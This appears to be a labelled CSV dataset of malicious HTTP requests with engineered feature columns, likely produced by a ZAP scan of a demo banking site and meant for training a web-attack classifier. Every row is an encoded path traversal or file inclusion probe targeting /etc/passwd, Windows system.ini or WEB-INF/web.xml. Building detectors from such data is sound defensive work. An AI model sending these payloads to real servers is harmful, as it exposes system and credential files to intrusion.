method,path,body,single_q,double_q,dashes,braces,spaces,percentages,semicolons,angle_brackets,special_chars,path_length,body_length,badwords_count,class
GET,/Documents/JohnSmith/index.jsp?content=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,105,0,1,bad
GET,/default.jsp?content=c%3A%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,42,0,1,bad
GET,/Privacypolicy.jsp?sec=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&template=US,,0,0,0,0,0,0,0,0,0,101,0,1,bad
POST,/sendFeedback,cfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,170,0,bad
GET,/disclaimer.htm?url=c%3A%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,41,0,1,bad
GET,/images/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,92,0,1,bad
GET,/my%20documents,,0,0,0,0,1,0,0,0,0,13,0,0,bad
GET,/index.jsp?content=c%3A%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,40,0,1,bad
GET,/Documents/JohnSmith/index.jsp?content=%2Fetc%2Fpasswd,,0,0,0,0,0,0,0,0,0,50,0,0,bad
GET,/index.jsp?content=c%3A%2FWindows%2Fsystem.ini&job=MortgageLendingAccountExecutive%3ASales,,0,0,0,0,0,0,0,0,0,82,0,1,bad
POST,/doLogin,uid=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,96,2,bad
POST,/doSubscribe,txtEmail=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&btnSubmit=Subscribe,0,0,0,0,0,0,0,0,0,12,95,1,bad
POST,/sendFeedback,cfile=c%3A%2F&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,115,0,bad
GET,/my%20documents/JohnSmith,,0,0,0,0,1,0,0,0,0,23,0,0,bad
POST,/sendFeedback,cfile=%2F&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,113,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents,,0,0,0,0,3,0,0,0,0,43,0,0,bad
POST,/doLogin,uid=%2Fetc%2Fpasswd&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,41,1,bad
POST,/sendFeedback,cfile=c%3A%5C&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,115,0,bad
GET,/index.jsp?content=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,85,0,1,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=c%3A%2FWindows%2Fsystem.ini,,0,0,0,0,3,0,0,0,0,83,0,1,bad
GET,/index.jsp?content=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&job=MortgageLendingAccountExecutive%3ASales,,0,0,0,0,0,0,0,0,0,127,0,1,bad
POST,/sendFeedback,cfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,160,0,bad
POST,/doLogin,uid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,88,1,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,,0,0,0,0,3,0,0,0,0,128,0,1,bad
GET,/search.jsp?query=c%3A%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,39,0,1,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=c%3A%5CWindows%5Csystem.ini,,0,0,0,0,3,0,0,0,0,83,0,1,bad
POST,/doLogin,uid=c%3A%2F&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,33,1,bad
GET,/search.jsp?query=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,84,0,1,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini,,0,0,0,0,3,0,0,0,0,128,0,1,bad
GET,/static/index.jsp?content=c%3A%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,47,0,1,bad
GET,/survey_questions.jsp?step=c%3A%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,48,0,1,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%2Fetc%2Fpasswd,,0,0,0,0,3,0,0,0,0,73,0,0,bad
GET,/static/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,92,0,1,bad
GET,/search.jsp?query=c%3A%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,39,0,1,bad
GET,/survey_questions.jsp?step=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,93,0,1,bad
POST,/doLogin,uid=%2F&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,31,1,bad
GET,/search.jsp?query=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,84,0,1,bad
GET,/static/index.jsp?content=c%3A%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,47,0,1,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd,,0,0,0,0,3,0,0,0,0,120,0,0,bad
GET,/survey_questions.jsp?step=c%3A%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,48,0,1,bad
GET,/static/index.jsp?content=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,92,0,1,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=c%3A%2F,,0,0,0,0,3,0,0,0,0,65,0,0,bad
GET,/survey_questions.jsp?step=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,93,0,1,bad
POST,/doLogin,uid=c%3A%5C&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,33,1,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%2F,,0,0,0,0,3,0,0,0,0,63,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=c%3A%5C,,0,0,0,0,3,0,0,0,0,65,0,0,bad
POST,/doLogin,uid=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,78,1,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F,,0,0,0,0,3,0,0,0,0,110,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=WEB-INF%2Fweb.xml,,0,0,0,0,3,0,0,0,0,77,0,0,bad
POST,/doLogin,uid=WEB-INF%2Fweb.xml&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,45,1,bad
GET,/Privacypolicy.jsp?sec=Careers&template=c%3A%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,61,0,1,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=WEB-INF%5Cweb.xml,,0,0,0,0,3,0,0,0,0,77,0,0,bad
GET,/Privacypolicy.jsp?sec=Careers&template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,106,0,1,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%2FWEB-INF%2Fweb.xml,,0,0,0,0,3,0,0,0,0,78,0,0,bad
GET,/index.jsp?content=inside_jobs.htm&job=c%3A%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,60,0,1,bad
POST,/doLogin,uid=WEB-INF%5Cweb.xml&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,45,1,bad
GET,/Privacypolicy.jsp?sec=Careers&template=c%3A%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,61,0,1,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%5CWEB-INF%5Cweb.xml,,0,0,0,0,3,0,0,0,0,78,0,0,bad
GET,/index.jsp?content=inside_jobs.htm&job=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini,,0,0,0,0,0,0,0,0,0,105,0,1,bad
GET,/images/index.jsp?content=%5Cindex.jsp,,0,0,0,0,0,0,0,0,0,36,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=thishouldnotexistandhopefullyitwillnot,,0,0,0,0,3,0,0,0,0,100,0,0,bad
GET,/search.jsp?query=%2FWEB-INF%2Fweb.xml,,0,0,0,0,0,0,0,0,0,34,0,0,bad
GET,/Privacypolicy.jsp?sec=Careers&template=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,106,0,1,bad
GET,/survey_questions.jsp?step=WEB-INF%5Cweb.xml,,0,0,0,0,0,0,0,0,0,42,0,0,bad
GET,/index.jsp?content=inside_jobs.htm&job=c%3A%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,60,0,1,bad
GET,/static/index.jsp?content=WEB-INF%5Cweb.xml,,0,0,0,0,0,0,0,0,0,41,0,0,bad
POST,/doLogin,uid=%2FWEB-INF%2Fweb.xml&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,46,1,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=index.jsp,,0,0,0,0,3,0,0,0,0,71,0,0,bad
GET,/Privacypolicy.jsp?sec=Careers&template=%2Fetc%2Fpasswd,,0,0,0,0,0,0,0,0,0,51,0,0,bad
GET,/search.jsp?query=%5CWEB-INF%5Cweb.xml,,0,0,0,0,0,0,0,0,0,34,0,0,bad
GET,/survey_questions.jsp?step=%2FWEB-INF%2Fweb.xml,,0,0,0,0,0,0,0,0,0,43,0,0,bad
GET,/static/index.jsp?content=%2FWEB-INF%2Fweb.xml,,0,0,0,0,0,0,0,0,0,42,0,0,bad
GET,/index.jsp?content=inside_jobs.htm&job=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini,,0,0,0,0,0,0,0,0,0,105,0,1,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%2Findex.jsp,,0,0,0,0,3,0,0,0,0,72,0,0,bad
GET,/search.jsp?query=thishouldnotexistandhopefullyitwillnot,,0,0,0,0,0,0,0,0,0,56,0,0,bad
GET,/Privacypolicy.jsp?sec=Careers&template=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd,,0,0,0,0,0,0,0,0,0,98,0,0,bad
GET,/static/index.jsp?content=%5CWEB-INF%5Cweb.xml,,0,0,0,0,0,0,0,0,0,42,0,0,bad
GET,/index.jsp?content=inside_jobs.htm&job=%2Fetc%2Fpasswd,,0,0,0,0,0,0,0,0,0,50,0,0,bad
POST,/doLogin,uid=%5CWEB-INF%5Cweb.xml&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,46,1,bad
GET,/Privacypolicy.jsp?sec=Careers&template=c%3A%2F,,0,0,0,0,0,0,0,0,0,43,0,0,bad
GET,/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%5Cindex.jsp,,0,0,0,0,3,0,0,0,0,72,0,0,bad
GET,/static/index.jsp?content=thishouldnotexistandhopefullyitwillnot,,0,0,0,0,0,0,0,0,0,64,0,0,bad
GET,/index.jsp?content=inside_jobs.htm&job=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd,,0,0,0,0,0,0,0,0,0,97,0,0,bad
GET,/Privacypolicy.jsp?sec=Careers&template=%2F,,0,0,0,0,0,0,0,0,0,41,0,0,bad
GET,/index.jsp?content=inside_jobs.htm&job=c%3A%2F,,0,0,0,0,0,0,0,0,0,42,0,0,bad
GET,/static/index.jsp?content=index.jsp,,0,0,0,0,0,0,0,0,0,35,0,0,bad
POST,/doLogin,uid=thishouldnotexistandhopefullyitwillnot&passw=ZAP&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,68,1,bad
GET,/Privacypolicy.jsp?sec=Careers&template=c%3A%5C,,0,0,0,0,0,0,0,0,0,43,0,0,bad
GET,/index.jsp?content=inside_jobs.htm&job=%2F,,0,0,0,0,0,0,0,0,0,40,0,0,bad
GET,/static/index.jsp?content=%2Findex.jsp,,0,0,0,0,0,0,0,0,0,36,0,0,bad
GET,/index.jsp?content=inside_jobs.htm&job=c%3A%5C,,0,0,0,0,0,0,0,0,0,42,0,0,bad
GET,/static/index.jsp?content=%5Cindex.jsp,,0,0,0,0,0,0,0,0,0,36,0,0,bad
POST,/doLogin,uid=ZAP&passw=c%3A%2FWindows%2Fsystem.ini&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,51,2,bad
GET,/index.jsp?content=inside_jobs.htm&job=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F,,0,0,0,0,0,0,0,0,0,87,0,0,bad
GET,/index.jsp?content=inside_jobs.htm&job=WEB-INF%2Fweb.xml,,0,0,0,0,0,0,0,0,0,54,0,0,bad
POST,/doLogin,uid=ZAP&passw=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,96,2,bad
GET,/index.jsp?content=inside_jobs.htm&job=WEB-INF%5Cweb.xml,,0,0,0,0,0,0,0,0,0,54,0,0,bad
GET,/index.jsp?content=inside_jobs.htm&job=%2FWEB-INF%2Fweb.xml,,0,0,0,0,0,0,0,0,0,55,0,0,bad
POST,/doLogin,uid=ZAP&passw=c%3A%5CWindows%5Csystem.ini&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,51,2,bad
GET,/index.jsp?content=inside_jobs.htm&job=%5CWEB-INF%5Cweb.xml,,0,0,0,0,0,0,0,0,0,55,0,0,bad
GET,/index.jsp?content=inside_jobs.htm&job=thishouldnotexistandhopefullyitwillnot,,0,0,0,0,0,0,0,0,0,77,0,0,bad
POST,/doLogin,uid=ZAP&passw=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Csystem.ini&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,96,2,bad
POST,/doLogin,uid=ZAP&passw=%2Fetc%2Fpasswd&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,41,1,bad
POST,/sendFeedback,cfile=comments.txt&name=c%3A%2FWindows%2Fsystem.ini&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+,0,0,0,0,7,0,0,0,0,13,142,1,bad
POST,/doLogin,uid=ZAP&passw=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&btnSubmit=Login,0,0,0,0,0,0,0,0,0,8,88,1,bad
